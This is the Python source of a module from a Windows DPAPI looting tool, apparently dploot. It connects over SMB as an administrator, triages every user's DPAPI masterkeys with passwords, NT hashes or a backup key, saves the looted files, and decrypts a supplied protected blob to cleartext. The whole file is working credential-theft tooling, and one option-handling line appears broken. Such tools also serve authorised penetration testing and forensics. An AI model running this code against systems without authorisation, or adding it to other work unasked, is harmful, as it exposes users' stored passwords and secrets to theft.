import argparse
import base64
import logging
import os
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import (
    add_masterkeys_argument_group,
    parse_masterkeys_options,
)

from impacket.dpapi import DPAPI_BLOB

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, find_guid, find_sha1, handle_outputdir_option
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file, Masterkey

NAME = "blob"


class BlobAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None

        if not self.handle_blob_option(self.options.blob):
            sys.exit(1)

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)
        
        if self.options.masterkey is not None:
            guid, sha1 = self.options.masterkey.split(":")
            self.masterkeys[Masterkey(
                guid=find_guid(guid),
                sha1=find_sha1(sha1),
            )]

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(
            self.options, self.target
        )

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            logging.info("Trying to decrypt DPAPI blob\n")
            DPAPI_BLOB(self.blob).dump()
            masterkey = find_masterkey_for_blob(self.blob, masterkeys=self.masterkeys)
            if masterkey is not None:
                cleartext = decrypt_blob(blob_bytes=self.blob, masterkey=masterkey, entropy=self.options.entropy if self.options.entropy != "" else None)
                print("Data decrypted: %s" % cleartext)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin
    
    def handle_blob_option(self, blob_argument):
        if os.path.isfile(blob_argument):
            with open(blob_argument, "rb") as f:
                self.blob = f.read()
            return True
        else:
            try:
                self.blob = base64.b64decode(blob_argument)
                return True
            except Exception:
                logging.error(f"{blob_argument} does not seems to be a file nor a b64 encoded blob.")
        return False

def entry(options: argparse.Namespace) -> None:
    a = BlobAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Decrypt DPAPI blob. Can fetch masterkeys on target"
    )

    group = subparser.add_argument_group("vaults options")

    group.add_argument(
        "-blob",
        action="store",
        required=True,
        help=("Blob base64 encoded or in file"),
    )

    group.add_argument(
        "-masterkey",
        action="store",
        help=("{GUID}:SHA1 masterkey"),
    )

    group.add_argument(
        "-entropy",
        action="store",
        help=("Entropy value"),
    )
    
    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_masterkeys_argument_group(group)
    add_target_argument_group(subparser)

    return NAME, entry
